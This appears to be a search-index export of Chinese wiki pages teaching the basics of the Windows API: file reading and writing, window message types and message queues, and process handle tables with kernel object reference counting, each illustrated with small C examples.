读/写/拷贝/删除文件ReadFile()/WriteFile()/CopyFile()/DeleteFile() 1234567BOOL ReadFile( [in] HANDLE hFile, //文件句柄 [out] LPVOID lpBuffer, //指向读取文件数据存储的内存缓冲区 [in] DWORD nNumberOfBytesToRead, //从文件中要读多少。不能大于lpBuffer内存块的大小，要不会溢出 [out, optional] LPDWORD lpNumberOfBytesRead, //实际读了多少数据 [in, out, optional] LPOVERLAPPED lpOverlapped //overlapped buffer 学习到网络编程异步模型时再关注这个参数); lpOverlapped：输入参数，指向OVERLAPPED结构体的指针，如果调用CreateFile时设置了FILE_FLAG_OVERLAPPED标志，则需要使用该参数。可以为NULL。 1234567BOOL WriteFile( [in] HANDLE hFile, //文件句柄 [in] LPCVOID lpBuffer, //data buffer 要写入的数据在哪 [in] DWORD nNumberOfBytesToWrite, //number of bytes to write 要写多少字节 [out, optional] LPDWORD lpNumberOfBytesWritten, //number of bytes written 实际写多少字节 [in, out, optional] LPOVERLAPPED lpOverlapped //overlapped buffer); 12345BOOL CopyFile( [in] LPCTSTR lpExistingFileName, //已经存在的所需复制文件的源路径 [in] LPCTSTR lpNewFileName, //新文件路径，复制文件的目的路径 [in] BOOL bFailIfExists //目的路径的文件已存在时是否覆盖); bFailIfExists TRUE：lpNewFileName名字的文件已存在，不覆盖，函数执行失败 FALSE：即使lpNewFileName名字的文件已存在，会覆写文件，函数执行成功 123BOOL DeleteFile( [in] LPCTSTR lpFileName); 示例 查找文件FindFirstFile()/FindNextFile() 1234HANDLE FindFirstFileA( [in] LPCSTR lpFileName, [out] LPWIN32_FIND_DATAA lpFindFileData); 1234BOOL FindNextFileA( [in] HANDLE hFindFile, [out] LPWIN32_FIND_DATAA lpFindFileData); 示例123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#include &lt;windows.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;int main(int argc, char* argv[])&#123; // 创建或打开文件 HANDLE hFile = CreateFile( &quot;C:\\\\A.txt&quot;, // 文件名：要打开的文件路径 GENERIC_READ, // 访问模式：打开文件以进行读取 0, // 共享模式：不与其他进程共享文件 NULL, // 安全属性：默认安全设置 OPEN_EXISTING, // 创建方式：只打开现有文件 FILE_ATTRIBUTE_NORMAL, // 文件属性：普通文件属性 NULL // 模板文件：不使用模板 ); if (hFile == INVALID_HANDLE_VALUE) &#123; printf(&quot;无法打开文件。 &quot;); return 1; &#125; // 只读取文件的前10个字节 DWORD bytesToRead = 10; LPSTR pszBuffer = (LPSTR)malloc(bytesToRead + 1); // 分配11个字节，多出的一个字节用于存储字符串结束符&#x27;\\0&#x27; ZeroMemory(pszBuffer, bytesToRead + 1); // 初始化内存区域 // 设置文件指针到文件开头 SetFilePointer(hFile, 0, NULL, FILE_BEGIN); // 读取文件内容 DWORD dwReadLength; // 实际读取的字节数 BOOL readSuccess = ReadFile( hFile, // 文件句柄：操作的文件 pszBuffer, // 缓冲区：存储读取数据的缓冲区 bytesToRead, // 读取字节数：要读取的字节数 &amp;dwReadLength, // 实际读取的字节数 NULL // 重叠结构：这里不使用重叠结构 ); if (!readSuccess) &#123; printf(&quot;读取文件时发生错误。 &quot;); CloseHandle(hFile); free(pszBuffer); return 1; &#125; // 输出缓冲区内容 pszBuffer[dwReadLength] = &#x27;\\0&#x27;; // 确保有字符串结束符 printf(&quot;读取的内容：%s &quot;, pszBuffer); // 释放内存 free(pszBuffer); // 关闭文件句柄 CloseHandle(hFile); return 0;&#125; 小结 在Windows系统下无论是哪个文件系统，文件系统组织结构都是：最上层是卷，然后下一层是目录（目录中之下可以还是目录，或者是文件），最底层是文件。 卷相关API 获取卷GetLogicalDrives() 获取一个卷的字符串GetLogicalDriveStrings() 获取卷的类型GetDriveType() 获取卷的详细信息GetVolumeInformation() 目录相关API 创建目录CreateDirectory() 删除目录RemoveDirectory() 修改目录名称MoveFile() 获取当前进程的目录GetCurrentDirectory() 设置当前进程的目录SetCurrentDirectory() 文件相关API 创建文件CreateFile() 获取文件长度GetFileSize() 获取文件属性和信息GetFileAttributes()/GetFileAttributesEx()"},{"title":"消息类型","path":"/wiki/Windows_API/消息类型.html","content":"前言 消息的产生与处理流程 当用户点击某个窗口，这个行为就会产生一个消息，操作系统最先得到这个消息，操作系统会判断这个消息要发送给哪个窗口，操作系统找到窗口后将这个消息放到这个窗口对象所属线程的消息队列中。应用层的GetMessage不停地从消息队列中取消息，取出来的消息放在MSG结构体中。 1234567MSG msg; // msg: 用于接收消息的MSG结构体GetMessage( &amp;msg, // &amp;msg: 指向MSG结构体的指针，用于存储接收到的消息 NULL, // NULL: 指定要检索的消息的窗口句柄。NULL表示接收任何窗口的消息 0, // 0: 要检索的第一个消息的最小消息值。0表示接收所有类型的消息 0 // 0: 要检索的最后一个消息的最大消息值。0同样表示接收所有类型的消息); 12345678910typedef struct tagMSG&#123; HWND hwnd; // 消息所属窗口的句柄 UINT message; // 消息的标识符，表示什么类型的消息，如WM_PAINT、WM_QUIT等。 WPARAM wParam; // 与消息相关的附加信息。具体含义取决于消息的类型。 LPARAM lParam; // 与消息相关的附加信息。具体含义取决于消息的类型。 DWORD time; // 消息被创建的时间（系统启动后的毫秒数）。 POINT pt; // 消息发生时的光标位置，相对于屏幕的坐标。 DWORD lPrivate; // 私有字段，用于操作系统内部使用，应用程序通常不使用此字段。&#125; MSG, *PMSG, *NPMSG, *LPMSG; 从MSG结构体中的HWND成员可以看出，消息是针对窗口的 但MSG消息结构体中只有窗口对象的句柄HWND，没有窗口过程函数的信息。所以需要调用DispatchMessage(&amp;msg)根据HWND找到窗口过程函数（根据HWND进内核查全局窗口句柄表，找到窗口对象，找到这个窗口对象的窗口过程函数）。最后由内核发起调用，执行窗口过程函数（窗口过程函数在我们的代码中，在应用层，在3环，所以下图最后箭头是从内核指向应用层的），将消息处理掉。 而且，可以发现窗口过程函数的四个参数就是MSG消息结构体前四个字段。 1234567891011typedef struct tagMSG&#123; HWND hwnd; // 消息所属窗口的句柄 UINT message; // 消息的标识符，表示什么类型的消息，如WM_PAINT、WM_QUIT等。 WPARAM wParam; // 与消息相关的附加信息。具体含义取决于消息的类型。 LPARAM lParam; // 与消息相关的附加信息。具体含义取决于消息的类型。 DWORD time; // 消息被创建的时间（系统启动后的毫秒数）。 POINT pt; // 消息发生时的光标位置，相对于屏幕的坐标。 DWORD lPrivate; // 私有字段，用于操作系统内部使用，应用程序通常不使用此字段。&#125; MSG, *PMSG, *NPMSG, *LPMSG; 可以理解为分发消息后，MSG里的time和pt成员是给操作系统用的，操作系统使用到了这些成员，放置到了相应线程的消息队列中。后面系统调用我们写的窗口过程函数，窗口过程函数用不到给系统用的这些成员，所以窗口过程函数中的参数是MSG的一部分，只有窗口过程函数要用到的成员： 1234567LRESULT CALLBACK WindowProc(HWND hwnd, // 窗口句柄 UINT uMsg, // 消息标识 WPARAM wParam, // 附加消息信息 LPARAM lParam) // 附加消息信息&#123; return DefWindowProc(hwnd, uMsg, wParam, lParam); // 默认窗口处理函数&#125; 能产生消息的四种情况：鼠标，键盘，其他的应用程序，操作系统的内核程序。每种消息都有一个编号，对应的字段是MSG.message。本小节就是讲解消息类型。 消息类型 体会消息 实验：在窗口过程函数中打印uMsg字段，体会下消息 1234567891011LRESULT CALLBACK WindowProc(HWND hwnd, // 窗口句柄 UINT uMsg, // 消息标识 WPARAM wParam, // 附加消息信息 LPARAM lParam) // 附加消息信息&#123; char szOutBuff[0x80]; sprintf(szOutBuff, &quot;Message: %x - %x &quot;, hwnd, uMsg); OutputDebugString(szOutBuff); return DefWindowProc(hwnd, uMsg, wParam, lParam); // 默认窗口处理函数&#125; 运行后还没对窗口有操作（发消息），就已经看到有很多消息了。说明：消息是时刻在产生的。除了用户的鼠标，键盘，还可能有其他的应用程序，操作系统内核程序发的消息。 每个uMsg字段都对应着一种消息，比如1就是对应WM_CREATE，意思就是窗口被创建。 WM：WindowsMessage，窗口消息的缩写 1#define WM_CREATE 0x0001 处理窗口关闭消息 程序运行后，用户可以对窗口进行拖动，最小化，最大化等操作，这是因为程序用了默认窗口过程函数来处理了这些消息DefWindowProc(hwnd, uMsg, wParam, lParam);。而在实际开发中，针对自己需要的消息进行处理即可，其他的就交给默认的窗口过程函数。比如这里我们处理一下窗口退出的消息WM_DESTROY。 12345678910111213141516LRESULT CALLBACK WindowProc(HWND hwnd, // 窗口句柄 UINT uMsg, // 消息标识 WPARAM wParam, // 附加消息信息 LPARAM lParam) // 附加消息信息&#123; switch (uMsg) &#123; case WM_DESTROY: // 当窗口关闭则退出进程 &#123; PostQuitMessage(0); break; &#125; &#125; return DefWindowProc(hwnd, uMsg, wParam, lParam); // 默认窗口处理函数&#125; 有了上面case WM_DESTROY: 那段对窗口退出的处理代码，当用户点击窗口关闭按钮时，进程会一块退出。没加这段代码之前，关闭窗口就只是关闭窗口，而进程还在（关闭窗口后窗口看不见了，但进程管理器中还能看到进程）。 处理键盘消息 键盘按下消息是WM_KEYDOWN。当uMsg是WM_KEYDOWN消息时 wParam：The virtual-key code of the nonsystem key. See Virtual-Key Codes. lParam：包含了与按键事件相关的额外信息 0-15位：重复计数（表示自上次消息以来按键被按下的次数） 16-23位：扫描码（表示按键的硬件扫描码） 24位：扩展键标志（如果是由扩展键生成的，则该位为1） 25-28位：保留，不使用 29位：上下文代码（如果在中断时发出，则该位为1） 30位：先前的键状态（如果按键之前已经按下，则为1；如果之前未按下，则为0） 31位：转换状态（如果消息是由转换状态（例如将非字符键转换为字符键）生成的，则该位为1） For more detail, see Keystroke Message Flags. 注意，键盘原生的消息是virtual-key messages（虚拟键消息）。如果想得到character messages（字符消息），那么在DispatchMessage分发消息前需要调用TranslateMessage进行消息转换（Translates virtual-key messages into character messages.） 前面有进行消息翻译TranslateMessage(&msg); 这里代码略1234567891011121314151617LRESULT CALLBACK WindowProc(HWND hwnd, // 窗口句柄 UINT uMsg, // 消息标识 WPARAM wParam, // 附加消息信息 LPARAM lParam) // 附加消息信息&#123; switch (uMsg) &#123; // 当键盘按下则处理 case WM_KEYDOWN: &#123; char szOutBuff[0x80]; sprintf(szOutBuff, &quot;Message: %x - %x - %x &quot;, uMsg, wParam, lParam); OutputDebugString(szOutBuff); &#125; &#125; return DefWindowProc(hwnd, uMsg, wParam, lParam); // 默认窗口处理函数&#125; 123456 1e0001 0000 0000 0001 1110 0000 0000 0000 0001 401e0001 0100 0000 0001 1110 0000 0000 0000 0001第30位为1，表示先前的键已按下 lParam字段解读： 第一条消息1e0001： 重复计数：0x0001（1次） 扫描码：0x001e（通常是字母“A”的扫描码） 扩展键标志：0（不是扩展键） 先前的键状态：0（之前未按下） 转换状态：0（不是由转换状态生成的） 这条消息表示键盘上的“A”键被首次按下。 第二条消息401e0001： 重复计数：0x0001（1次） 扫描码：0x001e（仍是“A”键） 扩展键标志：0（不是扩展键） 先前的键状态：1（之前已经按下） 转换状态：0（不是由转换状态生成的） 这条消息表示“A”键仍然被按住，它是自键盘上次被按下以来的另一个消息。 因此，这两条消息表明用户先按下了“A”键，然后一直按住未释放。这种行为在长时间按住某个键时是典型的，首先会接收到一个按键首次按下的消息，随后如果按键继续保持按下状态，会周期性地接收到更多此类消息。 WM_KEYDOWN和WM_CHAR消息的区别WM_KEYDOWN和WM_CHAR是Windows编程中用于处理键盘输入的两种不同类型的消息，它们在处理键盘事件时有着明显的区别：WM_KEYDOWN:这是一个虚拟键消息，当用户按下键盘上的任何键时，就会触发WM_KEYDOWN消息。它提供了虚拟键码（wParam参数），表示被按下的键。例如，如果按下回车键，虚拟键码将是VK_RETURN。WM_KEYDOWN消息用于处理键盘上的非字符键（如功能键、控制键等）以及字符键。lParam参数提供了关于按键事件的额外信息，如按键的重复计数、扫描码、是否是扩展键等。WM_CHAR:这是一个字符消息，当用户按下能产生字符的键时，就会触发WM_CHAR消息。WM_CHAR消息通过wParam参数提供实际的字符代码，这通常对应于按键生成的字符，考虑了键盘布局、按下的是大写键还是小写键、是否同时按下了Shift键等。WM_CHAR适合处理可打印字符的输入，如文本输入。不会为非字符键生成WM_CHAR消息。与WM_KEYDOWN不同，WM_CHAR不关心按键的物理位置或特定的硬件键码。总的来说，WM_KEYDOWN消息更多地关注物理键盘上的键的状态，而WM_CHAR消息关注的是这些按键操作所产生的字符。在编写需要处理文本输入的应用程序时，通常会更多地关注WM_CHAR消息，因为它提供了对应于用户按键的实际字符。而WM_KEYDOWN则适用于那些需要处理非字符键（如方向键、功能键等）的场景。 更多的消息示例 处理过的消息要return 0，表示这个消息已经处理过了。因为系统内部很多函数在调来调去，窗口过程函数只是其中的一环，return 0表示这个消息处理过了。 下面这个程序需要用到自己封装的DbgPrintf，下面的代码中省略了 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153#include &quot;OutputDebugStringF.h&quot;#include &lt;Windows.h&gt;LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);int APIENTRY WinMain(HINSTANCE hInstance, // 当前程序实例的句柄 HINSTANCE hPrevInstance, // 前一个实例的句柄，不再使用 LPSTR lpCmdLine, // 命令行参数 int nCmdShow) // 控制窗口显示方式的标志&#123; // 1. 定义要创建的窗口是什么样的 WNDCLASS wndClass = &#123; 0 &#125;; // 创建WNDCLASS窗口类对象，初始化填充为0 wndClass.hbrBackground = (HBRUSH)COLOR_BACKGROUND; // 窗口背景颜色 TCHAR className[] = TEXT(&quot;My First Window&quot;); wndClass.lpszClassName = className; // 窗口类名 wndClass.hInstance = hInstance; // 窗口实例句柄，窗口属于哪个进程，当前进程就是WinMain函数参数hInstance wndClass.lpfnWndProc = WindowProc; // 窗口过程函数 // 2. 创建并显示窗口 RegisterClass(&amp;wndClass); // 注册窗口类 HWND hWnd = CreateWindow(className, // 窗口类名 TEXT(&quot;窗口&quot;), // 窗口标题 WS_OVERLAPPEDWINDOW, // 窗口样式 10, 10, // 窗口位置 相对于父窗口的x坐标和y坐标是什么 600, 300, // 窗口大小 NULL, NULL, // 父窗口句柄和菜单句柄 这个窗口没有父窗口，写空；不需要菜单，写空 hInstance, // 实例句柄 NULL); // 附加参数 没，填空 if (hWnd == NULL) &#123; DbgPrintf(&quot;Error: %d&quot;, GetLastError()); return 0; &#125; ShowWindow(hWnd, SW_SHOW); // 显示窗口 // 3. 接收消息并处理 MSG msg; BOOL bRet; while ((bRet = GetMessage(&amp;msg, NULL, 0, 0) ) != 0) // 消息循环 &#123; if (bRet == -1) &#123; DbgPrintf(&quot;Error: %d&quot;, GetLastError()); return 0; &#125; else &#123; TranslateMessage(&amp;msg); // 翻译消息 DispatchMessage(&amp;msg); // 分发消息 &#125; &#125; return 0;&#125;LRESULT CALLBACK WindowProc(HWND hwnd, // 窗口句柄 UINT uMsg, // 消息标识 WPARAM wParam, // 附加消息信息 LPARAM lParam) // 附加消息信息&#123; switch (uMsg) &#123; // 窗口创建时触发的消息 case WM_CREATE: &#123; DbgPrintf(&quot;WM_CREATE %d %d &quot;, wParam, lParam); // wParam: 未使用 // lParam: 指向一个CREATESTRUCT结构的指针 //Defines the initialization parameters passed to the window procedure of an application. //These members are identical to the parameters of the CreateWindowEx function. CREATESTRUCT* createst = (CREATESTRUCT*)lParam; DbgPrintf(&quot;CREATESTRUCT %s &quot;, createst-&gt;lpszClass); //CREATESTRUCT结构里的参数都可以对应到CreateWindow或CreateWindowEx函数的参数 return 0; &#125; // 窗口移动时触发的消息 case WM_MOVE: &#123; DbgPrintf(&quot;WM_MOVE %d %d &quot;, wParam, lParam); // wParam: 未使用 // lParam: 包含窗口新位置的x和y坐标的低位和高位 POINTS points = MAKEPOINTS(lParam); // MAKEPOINTS宏将lParam转换为包含x和y坐标的POINTS结构 DbgPrintf(&quot;X Y %d %d &quot;, points.x, points.y); return 0; &#125; // 窗口大小改变时触发的消息 case WM_SIZE: &#123; DbgPrintf(&quot;WM_SIZE %d %d &quot;, wParam, lParam); // wParam: 调整窗口大小的类型（如SIZE_MAXIMIZED、SIZE_MINIMIZED） // lParam: 新的宽度在低位，新的高度在高位 int newWidth = (int)(short)LOWORD(lParam); // LOWORD宏获取lParam的低16位，表示宽度。转换方法直接从MSDN抄的 int newHeight = (int)(short)HIWORD(lParam); // HIWORD宏获取lParam的高16位，表示高度。转换方法直接从MSDN抄的 DbgPrintf(&quot;WM_SIZE %d %d &quot;, newWidth, newHeight); return 0; &#125; // 窗口关闭时触发的消息 case WM_DESTROY: &#123; DbgPrintf(&quot;WM_DESTROY %d %d &quot;, wParam, lParam); // wParam: 未使用 // lParam: 未使用 PostQuitMessage(0); return 0; &#125; // 键盘键释放时触发的消息 case WM_KEYUP: &#123; DbgPrintf(&quot;WM_KEYUP %d %d &quot;, wParam, lParam); // wParam: 被释放键的虚拟键码 // lParam: 按键的重复次数、扫描码等附加信息 return 0; &#125; // 键盘键按下时触发的消息 case WM_KEYDOWN: &#123; DbgPrintf(&quot;WM_KEYDOWN %d %d &quot;, wParam, lParam); // wParam: 被按下键的虚拟键码 // lParam: 按键的重复次数、扫描码等附加信息 return 0; &#125; // 鼠标左键按下时触发的消息 case WM_LBUTTONDOWN: &#123; DbgPrintf(&quot;WM_LBUTTONDOWN %d %d &quot;, wParam, lParam); // wParam: 包含了关于按键状态的信息（如是否同时按下了控制键或者移位键） // lParam: 鼠标点击位置的x和y坐标的低位和高位 POINTS points = MAKEPOINTS(lParam); DbgPrintf(&quot;WM_LBUTTONDOWN %d %d &quot;, points.x, points.y); return 0; &#125; &#125; return DefWindowProc(hwnd, uMsg, wParam, lParam); // 默认窗口处理函数&#125; 小结 能产生消息的四种情况：鼠标，键盘，其他的应用程序，操作系统的内核程序 MSG中的wParam和lParam是消息的附加信息，具体含义取决于消息的类型uMsg 想要得到键盘消息的字符消息，需要调用TranslateMessage将虚拟键消息转换为字符消息 在回调函数中用switch的case去处理自己关心的消息，其余的交给默认回调函数DefWindowProc处理 自己处理的消息处理完了要return 0，表示这个消息处理过了。因为我们自己写的窗口回调函数只是整个windows程序中间的一部分"},{"title":"消息队列","path":"/wiki/Windows_API/消息队列.html","content":"前言 windows系统（视窗操作系统）是一个基于窗口的操作系统，用户的交互主要发生在各种窗口上。例如，在记事本中输入文字，在菜单栏点击，在右上角的关闭按钮点击，或对窗口进行其他鼠标或键盘操作等。那么，notepad窗口是如何接收到用户的消息的（鼠标操作，键盘等）？为何用户在notepad上的操作，做出反应的是notepad而不是隔壁的飞鸽？ 事件 消息 在Windows操作系统中，事件是一个“动作”，这个动作可能是用户操作应用程序产生的，比如点击鼠标或敲击键盘，也可能是操作系统自己产生的，比如系统定时器的触发。而消息，就是用来描述这些“动作的”，比如：这个动作是什么时候产生的？哪个应用程序产生的？在什么位置产生的等等。消息就是对事件的一种封装。在Windows系统中，消息用MSG结构体来描述该消息的相关信息： 123456789101112131415typedef struct tagMSG&#123; HWND hwnd; // 表示消息所属的窗口，窗口句柄，实际就是窗口的一个编号 UINT message; // 消息的标识符，表示是什么类型的消息，是一个数值，数值不便于记录，所以用宏如WM_PAINT、WM_QUIT等来与数值对应 WPARAM wParam; // 与消息相关的附加信息。具体含义取决于消息的类型。 LPARAM lParam; // 与消息相关的附加信息。具体含义取决于消息的类型。 DWORD time; // 消息被创建的时间（系统启动后的毫秒数）。 POINT pt; // 消息发生时的鼠标位置，相对于左上角屏幕(0,0)的坐标。 DWORD lPrivate; // 私有字段，用于操作系统内部使用，应用程序通常不使用此字段。&#125; MSG, *PMSG, *NPMSG, *LPMSG;//光有message字段不足以描述消息。比如用户用鼠标点击了一下，message只能记录是鼠标还是键盘消息//无法记录更多的细节，比如鼠标左键点的还是右键点的，点了几次//因此，windows还用两个参数wParam和lParam用于描述附件信息。//所以，wParam和lParam参数的含义会随着不同的message而不同 原始草稿： Windows是一个事件驱动，基于消息的操作系统。用户的任何操作，如点击鼠标或按键，都被视为事件，操作系统会记录这些操作，将它们存储到一个结构体中，这个结构体就是消息。消息是Windows操作系统中用于表示用户操作或其他系统事件的结构体。 消息队列 用户在应用层所看到的所有窗口，它实际上都在内核层的win32k.sys中，也就是说在应用层的每个窗口在内核层都对应一个窗口对象。线程在内核中对应一个线程内核对象（结构体），如果这个线程创建了一个窗口，那么这个线程中就会有一个消息队列（具体的数据结构要中级班时才能细讲，目前就这么理解）。这个队列用于接收消息。用户对窗口的操作，如点击鼠标或按下键盘，其他进程通过API发生的消息，最终都会存储到相应线程的消息队列中。 一个线程即使创建了多个窗口，还是只有一个消息队列。如果没创建窗口，就没有消息队列。 消息的产生和处理 假设用户在dbgview窗口右上角的关闭按钮上按下鼠标左键，这个操作首先被操作系统捕捉到，将这个关闭（鼠标左键点击，点击时的坐标等信息）操作封装为消息（一个结构体）。这个消息首先会进到系统队列中，然后系统依次处理这些消息，根据消息中的坐标去内核遍历所有窗口对象，来确定对应的窗口对象。窗口对象结构体（WinObject）中有一个字段标识了这个窗口属于哪个线程。随后，这个消息就被放置在对应线程的消息队列中。 注意：一个进程可以有多个线程，一个线程可以有多个窗口对象。但每个窗口对象只属于一个线程。"},{"title":"句柄表","path":"/wiki/Windows_API/句柄表.html","content":"前言 使用CreateProcess创建进程时会返回一个结构体LPPROCESS_INFORMATION，里面是进程句柄，线程句柄，进程ID，线程ID字段。 123456typedef struct _PROCESS_INFORMATION &#123; HANDLE hProcess; //进程句柄 HANDLE hThread; //线程句柄 DWORD dwProcessId; //进程id DWORD dwThreadId; //线程id&#125; PROCESS_INFORMATION, *PPROCESS_INFORMATION, *LPPROCESS_INFORMATION; 本小节就来说下什么是句柄 内核对象 像进程、线程、文件、互斥体、事件等在内核都有一个对应的结构体，这些结构体由内核负责管理。我们管这样的对象叫做内核对象。 当我们创建一个进程时，操作系统就会在内核层单独给这个进程准备一个结构体EPROCESS 当我们创建一个线程时，操作系统就会在内核层单独给这个线程准备一个结构体ETHREAD 当我们创建一个文件时，操作系统就会在内核层单独给这个文件准备一个结构体FILE_OBJECT 可以在MSDN查询CloseHandle函数（函数功能：用来关闭句柄）来知道哪些是内核对象： 如何管理内核对象 如下图所示，每个进程会有一个内核对象，进程结构体EPROCESS。假设这个进程里 通过CreateProcess又创建了一个进程内核对象，那么在内核层就有一个相应的结构体 通过CreateThread又创建了一个线程内核对象，那么在内核层就有一个相应的结构体 通过CreateEvent又创建了一个事件内核对象，那么在内核层就有一个相应的结构体 通过CreateFile又创建了一个文件内核对象，那么在内核层就有一个相应的结构体 随之而来的一个问题：我们如何管理，如何使用这些结构体？最简单的办法：比如调用CreateProcess后你就将对应内核结构体的地址返回给我用。这种方案比较高效，但不安全。假设返回来的内核地址是0x81234567，如果应用层一不小心将返回来的地址修改为0x81234580，然后访问该地址。在应用层如果我们访问一个没挂物理页的地址会报0xC0000005的错误，但我们访问的是错误的内核地址，操作系统会直接蓝屏。 句柄表 微软为了安全性，不会将内核结构体的地址直接暴露给应用层。相反，它使用句柄表来间接引用这些对象。但请注意，不是每一个内核对象都有一个句柄表。比如文件、线程、事件（Event）虽然是内核对象，但它们没有句柄表。句柄表是每个进程才有一个句柄表。 如下图，每个进程有一个内核结构体EPROCESS，这个结构体里有一个成员是指针，该指针指向了一张表。表里存的是每个内核对象结构体A、B、C、D的地址，并给这些地址编上编号。当应用层想使用内核对象时，就将相应的编号返回去，如： 进程想使用进程内核对象A，则将A的编号1返给应用层 进程想使用线程内核对象B，则将B的编号2返给应用层 进程想使用事件内核对象，则将C的编号3返给应用层 进程想使用文件内核对象，则将D的编号4返给应用层 也就是说开发者在应用层拿到的Handle其实是句柄表里的一个索引值。 编号 存的内核地址 1 A 2 B 3 C 4 D 小结 每个进程都有一张句柄表，表里存的是当前进程创建的所有内核对象的一种映射关系，应用层得到的Handle的值实际上是表里的一个索引。有了句柄，才能操作内核对象。只有通过句柄才能操作内核对象。 使用句柄操作内核对象的例子 比如使用pi.Thread句柄来挂起notepad进程。在SuspendThread那行下断点，调试运行。notepad被正常创建后能正常使用，单步执行SuspendThread后就处于挂起状态，假死，无法操作，再单步执行ResumeThread就恢复正常了。 12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;windows.h&gt;#include &lt;stdio.h&gt;int main(int argc, char* argv[])&#123; TCHAR childProcessName[] = TEXT(&quot;C:/WINDOWS/system32/notepad.exe&quot;); STARTUPINFO si; PROCESS_INFORMATION pi; ZeroMemory(&amp;si, sizeof(si)); //置0 ZeroMemory(&amp;pi, sizeof(pi)); //置0 si.cb = sizeof(si); //填充该成员，记录结构体大小 if (CreateProcess( childProcessName, //进程名称 NULL, //命令行参数 NULL, //进程句柄不可以被继承 NULL, //线程句柄不可以被继承 FALSE, //不继承父进程句柄 0, //没有创建标志 NULL, //使用父进程环境变量 NULL, //使用父进程目录作为当前目录，可以自己设置目录 &amp;si, //STARTUPINFOW结构体详细信息 &amp;pi) //PROCESS_INFORMATION结构体进程信息 ) &#123; printf(&quot;CreateProcess Successfully! &quot;); &#125; else &#123; printf(&quot;CreateProcess Error: %d &quot;, GetLastError()); &#125; SuspendThread(pi.hThread); //挂起线程 ResumeThread(pi.hThread); //恢复线程 CloseHandle(pi.hProcess); CloseHandle(pi.hThread); return 0;&#125; 多进程共享一个内核对象 0环是所有进程都共用的内存，这意味着同一个内核对象可以在不同的进程之间共享。 当一个进程创建一个内核对象时，这个内核对象对应的结构体里有个引用计数器（它表示有多少个句柄指向该内核对象）。当其他进程打开（或复制）一个指向这个内核对象的句柄时，引用计数器就加1。当任一进程使用CloseHandle关闭指向该内核对象的句柄时，引用计数器便减1。只有当引用计数器减至0时，即没有任何进程持有指向该内核对象的句柄时，内核对象才会被销毁。（开发者通常被CloseHandle名字误导，以为该函数就是关闭释放内核对象。） 如下图，A进程通过CreateProcess创建了一个内核对象A，内核对象A引用计数器增加为1。在进程A的句柄表中，会有一个指向内核对象A的句柄（例如句柄编号1）。随后，进程B通过OpenProcess打开内核对象A的句柄，此时内核对象A的引用计数器增加为2。在进程B的句柄表中，也会有一个指向内核对象A的句柄（例如句柄编号12，因为B进程的句柄表中还有其他B进程用到的内核对象映射关系）。进程A和进程B都是通过自己的句柄表来使用内核对象A。当进程B使用CloseHandle关闭对内核对象A的句柄时，内核对象A的引用计数器减少为1，但对象不会释放，因为还有进程A的句柄指向它。只有当所有指向内核对象A的句柄都被关闭，引用计数器减为0时，内核对象A才会被销毁。 每个进程都有自己的一个句柄表，这个句柄表是私有的，用于存储当前进程所拥有的所有句柄。这些句柄指向各种资源，包括文件、线程、进程等内核对象。句柄表中的每个句柄都有一个唯一的编号，但这些编号只在该进程的上下文中有意义。不同进程的句柄表彼此独立，因此一个句柄编号在一个进程中可能代表一个对象，在另一个进程中可能代表不同的对象或没有任何意义。比如拿A进程句柄表的Handle索引值比如1，到B的句柄表去找编号1对应的内核对象，这是没有意义的。 但有一个内核对象是例外：线程内核对象。线程内核对象引用计数器为0后（只是说明没有任何人的句柄指向了这个内核对象），并不会结束相关联的线程，不会释放线程内核对象；进程内核对象象引用计数器为0后，并不会结束相关联的进程，不会释放进程内核对象。 如果想释放一个线程内核对象，需要满足两个条件： 关闭线程 线程内核对象引用计数器为0 如果想释放一个进程内核对象，需要满足两个条件： 关闭进程（通过关闭进程里所有线程来关闭进程） 进程内核对象引用计数器为0 一个进程至少有一个线程（通常称为主线程）。如果一个进程没有任何活动线程，那么它通常会结束。所以当一个进程里所有线程都结束了，进程也就会结束。 CloseHandle Closing a thread handle does not terminate the associated thread or remove the thread object. Closing a process handle does not terminate the associated process or remove the process object. To remove a thread object, you must terminate the thread, then close all handles to the thread. For more information, see Terminating a Thread. To remove a process object, you must terminate the process, then close all handles to the process. For more information, see Terminating a Process. 例 12345678910111213141516171819202122232425262728293031323334353637383940#include &lt;windows.h&gt;#include &lt;stdio.h&gt;int main(int argc, char* argv[])&#123; TCHAR childProcessName[] = TEXT(&quot;C:/WINDOWS/system32/notepad.exe&quot;); STARTUPINFO si; PROCESS_INFORMATION pi; ZeroMemory(&amp;si, sizeof(si)); //置0 ZeroMemory(&amp;pi, sizeof(pi)); //置0 si.cb = sizeof(si); //填充该成员，记录结构体大小 if (CreateProcess( childProcessName, //进程名称 NULL, //命令行参数 NULL, //不继承进程句柄 NULL, //不继承线程句柄 FALSE, //不继承句柄 0, //没有创建标志 NULL, //使用父进程环境变量 NULL, //使用父进程目录作为当前目录，可以自己设置目录 &amp;si, //STARTUPINFOW结构体详细信息 &amp;pi) //PROCESS_INFORMATION结构体进程信息 ) &#123; printf(&quot;CreateProcess Successfully! &quot;); &#125; else &#123; printf(&quot;CreateProcess Error: %d &quot;, GetLastError()); &#125; CloseHandle(pi.hProcess); CloseHandle(pi.hThread); return 0;&#125; 执行上面这段代码，一开始这个程序的进程内核对象和线程内核对象创建后只有自己用，两个内核对象引用计数器都为1，然后执行了后面两行CloseHandle，进程内核对象和线程内核对象引用计数器都减为0。代码已经执行完了，发现记事本仍然可以使用。即使线程的内核对象计数器为0，线程仍会继续执行，直到它自然结束或被强制终止；而线程没死，进程也不会死。如果想释放掉线程内核对象，必须关掉线程（关闭记事本，点击右上角的“X”），关掉线程后线程内核对象引用计数器为0，此时线程内核对象被释放。又因为这个进程中没有活动线程了（一个进程只有在所有线程都已结束时才会结束），进程会结束，加之进程内核对象引用计数器也为0，所以进程内核对象这时才会释放。 创建内核对象时，设置该句柄是否&quot;可以/允许&quot;被继承 还是以这张图为例，一个父进程使用CreateProcess、CreateThread、CreateEvent、CreateFile等函数创建了A、B、C、D的内核对象，假设对应的索引值分别是1-A，2-B，3-C，4-D。调用这些函数传参时都有一个叫LPSECURITY_ATTRIBUTES类型的参数。 